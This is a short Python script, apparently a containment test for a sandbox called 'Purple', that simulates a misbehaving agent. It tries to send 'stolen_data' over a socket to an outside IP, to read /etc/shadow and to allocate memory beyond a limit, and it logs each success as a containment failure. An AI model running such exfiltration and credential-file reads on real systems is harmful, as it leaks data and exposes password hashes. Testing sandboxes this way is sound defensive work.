import sys
import socket
import os
import time

def log(msg):
    print(f"[AGENT] {msg}")

def try_exfiltration(target_ip, port):
    log(f"Attempting connection to {target_ip}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, port))
        s.send(b"stolen_data")
        s.close()
        log("❌ Connection SUCCESS (This should have been blocked!)")
        return True
    except Exception as e:
        log(f"✅ Connection BLOCKED/FAILED: {e}")
        return False

def try_snooping(path):
    log(f"Attempting to read {path}...")
    try:
        with open(path, 'r') as f:
            data = f.read()
            log(f"❌ Read SUCCESS: {data[:20]}... (This should have been blocked!)")
            return True
    except Exception as e:
        log(f"✅ Read BLOCKED: {e}")
        return False

def try_memory_hog(mb):
    log(f"Attempting to allocate {mb}MB of memory...")
    try:
        # Create a string of specified size
        data = " " * (mb * 1024 * 1024)
        log(f"❌ Allocation SUCCESS (Used {len(data)} bytes)")
        time.sleep(1) # Hold it
        return True
    except MemoryError:
        log("✅ Allocation BLOCKED (MemoryError)")
        return False
    except Exception as e:
        log(f"✅ Allocation FAILED: {e}")
        return False

def main():
    log("Starting Risky Agent Simulation...")
    
    # 1. Network Test (Try to hit a public DNS or similar)
    # 1.1.1.1 is Cloudflare DNS, usually up.
    # We will configure Purple to BLOCK this specific IP via eBPF.
    try_exfiltration("1.1.1.1", 80)
    
    # 2. Filesystem Test
    try_snooping("/etc/shadow")
    
    # 3. Resource Test
    # Try to allocate 300MB. We will set policy limit to 200MB.
    try_memory_hog(300)

    log("Simulation Complete.")

if __name__ == "__main__":
    main()
